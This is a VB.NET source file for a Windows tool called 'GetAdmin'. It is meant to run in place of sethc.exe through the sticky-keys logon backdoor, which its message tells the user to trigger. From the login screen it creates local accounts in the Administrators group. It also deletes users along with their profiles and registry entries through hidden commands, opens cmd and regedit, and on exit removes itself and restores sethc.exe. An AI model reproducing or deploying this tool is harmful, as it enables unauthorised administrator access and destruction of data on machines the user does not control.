Imports Microsoft.Win32
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Data
Imports System.Diagnostics
Imports System.DirectoryServices
Imports System.Drawing
Imports System.IO
Imports System.Linq
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Security.Principal
Imports System.Text
Imports System.Threading
Imports System.Threading.Tasks
Imports System.Windows.Forms
Imports System.Management

Namespace GetAdmin
	Partial Public Class Form1
		Inherits Form

		Public Shared UserName As String
		Public Shared Pass As String

		Private Shared mutex As New Mutex(True, "{8F6F0AC4-B9A1-45fd-A8CF-72F04E6BDE8F}")

		Private Function IsRunAsAdministrator() As Boolean
			Dim wi = WindowsIdentity.GetCurrent()
			Dim wp = New WindowsPrincipal(wi)

			Return wp.IsInRole(WindowsBuiltInRole.Administrator)
		End Function

		Public Sub New()
			InitializeComponent()
			If Not IsRunAsAdministrator() Then
				MessageBox.Show("This program needs administrator to run, please logout and then active sticky key(shift 5 times)", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Information)
				Environment.Exit(0)
			End If
			If Not mutex.WaitOne(TimeSpan.Zero, True) Then
				MessageBox.Show("You can only start one instance at a time", "GetAdmin.exe", MessageBoxButtons.OK, MessageBoxIcon.Error)
				Environment.Exit(0)
			Else
				mutex.ReleaseMutex()
			End If

			Refresh()
		End Sub

		Private Sub button2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button2.Click
			Delete()
			Me.Close()
		End Sub

		Private Sub button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button1.Click
			'GetAdmin
			Dim msg As String = createUser(textBox1.Text, textBox2.Text)
			If msg IsNot Nothing Then
				MessageBox.Show(msg)
				Return
			End If

			MessageBox.Show("Admin Account Created Successfully")
			Refresh()
		End Sub

		Private Sub button3_Click(ByVal sender As Object, ByVal e As EventArgs)
			Me.Close()
			Delete()
		End Sub

		Private Sub RemoveBtn_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button3.Click
			If comboBox1.SelectedItem Is Nothing Then
				MessageBox.Show("You didn't select anything, please select something", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Information)
				Return
			End If
			Dim answer As DialogResult = MessageBox.Show("You sure you want to delete that user?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
			If answer = System.Windows.Forms.DialogResult.Yes Then
				Dim selectedItem As String = comboBox1.SelectedItem.ToString()
				Dim SID As String = DirectCast(comboBox1.SelectedItem, ComboboxItem).Value.ToString()
				Dim message = removeUser(selectedItem)
				If message IsNot Nothing Then
					MessageBox.Show(message)
				Else
					MessageBox.Show("Successfully removed the user")

					Dim deleteFiles As DialogResult = MessageBox.Show("Do you want to delete the files and registries in that user profile too?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
					If deleteFiles = System.Windows.Forms.DialogResult.Yes Then
						removeFiles(selectedItem, SID)
						MessageBox.Show("Successfully removed the user profile")
					End If
				End If
				Refresh()
			End If
		End Sub

		Private Sub button4_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button4.Click
			Try
				Process.Start("cmd.exe")
			Catch ex As Exception
				MessageBox.Show($"There is an error while starting the app. Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
			End Try
		End Sub

		Private Sub button5_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button5.Click
			Try
				Process.Start("regedit.exe")
			Catch ex As Exception
				MessageBox.Show($"There is an error while starting the app. Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
			End Try
		End Sub

		Private Sub button6_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button6.Click
			Try
				Process.Start("taskmgr.exe")
			Catch ex As Exception
				MessageBox.Show($"There is an error while starting the app. Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
			End Try
		End Sub

		Private Sub button7_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button7.Click
			Try
				Process.Start("netplwiz.exe")
			Catch ex As Exception
				MessageBox.Show($"There is an error while starting the app. Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
			End Try
		End Sub

		Private Sub button8_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button8.Click
			Try
				Process.Start("explorer.exe", "C:\")
			Catch ex As Exception
				MessageBox.Show($"There is an error while starting the app. Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
			End Try
		End Sub

		Private Sub button9_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button9.Click
			Refresh()
		End Sub

		Private Sub Delete()
			Try
				Process.Start(New ProcessStartInfo() With {.Arguments = "/C choice /C Y /N /D Y /T 3 & Del """ & Application.ExecutablePath & """" & " & rename ""sethc.old.exe"" ""sethc.exe""", .WorkingDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase), .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True, .FileName = "cmd.exe"})
			Catch e As Exception
				'MessageBox.Show("There is an error, Sticky key won't work unless contact the creator for a fix(You could manually fix it: go to System32 then delete sethc.exe, rename sethc.old.exe to sethc.exe): " & e)
			End Try
		End Sub

#Disable Warning BC40005 ' Member shadows an overridable method in the base type
		Private Sub Refresh()
#Enable Warning BC40005 ' Member shadows an overridable method in the base type
			comboBox1.Items.Clear()

			Dim usersSearcher As New ManagementObjectSearcher("SELECT * FROM Win32_UserAccount")
			Dim users As ManagementObjectCollection = usersSearcher.Get()
			Dim localUsers = users.Cast(Of ManagementObject)().Where(Function(u) CBool(u("LocalAccount")) = True AndAlso CBool(u("Disabled")) = False AndAlso CBool(u("Lockout")) = False AndAlso Integer.Parse(u("SIDType").ToString()) = 1 AndAlso u("Name").ToString() <> "HomeGroupUser$")

			For Each user As ManagementObject In localUsers
				Dim item As New ComboboxItem()
				item.Text = user("Name").ToString()
				item.Value = user("SID").ToString()
				comboBox1.Items.Add(item)
			Next user
		End Sub

		Public Shared Function createUser(ByVal UserName As String, ByVal Pass As String) As String
			Try
				Dim AD As New DirectoryEntry("WinNT://" & Environment.MachineName & ",computer")
				Dim NewUser As DirectoryEntry = AD.Children.Add(UserName, "user")
				NewUser.Invoke("SetPassword", New Object() { Pass })
				NewUser.CommitChanges()
				Dim grp As DirectoryEntry

				grp = AD.Children.Find("Administrators", "group")
				If grp IsNot Nothing Then
					grp.Invoke("Add", New Object() { NewUser.Path.ToString() })
				End If
			Catch ex As Exception
				Return "There is an error while creating the account: " & ex.Message
			End Try
			Return Nothing
		End Function

'INSTANT VB NOTE: The parameter removeUser was renamed since Visual Basic will not allow parameters with the same name as their enclosing function or property:
		Private Function removeUser(ByVal removeUser_Renamed As String) As String
			Try
				Dim localDirectory As New DirectoryEntry("WinNT://" & Environment.MachineName.ToString())
				Dim users As DirectoryEntries = localDirectory.Children
				Dim user As DirectoryEntry = users.Find(removeUser_Renamed)
				users.Remove(user)
			Catch ex As Exception
				Return "There is an error while removing the account. Error: " & ex.Message
			End Try
			Return Nothing
		End Function

		Private Sub removeFiles(ByVal userName As String, ByVal SID As String)
			Try
				Process.Start(New ProcessStartInfo() With {.Arguments = $"/C rd /s /q ""{Path.GetPathRoot(Environment.SystemDirectory)}Users\{userName}""", .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True, .FileName = "cmd.exe"})
			Catch
			End Try
			Try
				Process.Start(New ProcessStartInfo() With {.Arguments = $"/C reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\{SID}"" /f", .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True, .FileName = "cmd.exe"})
			Catch
			End Try
		End Sub

		Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

		End Sub
	End Class

	Public Class ComboboxItem
		Public Property Text() As String
		Public Property Value() As Object

		Public Overrides Function ToString() As String
			Return Text
		End Function
	End Class
End Namespace
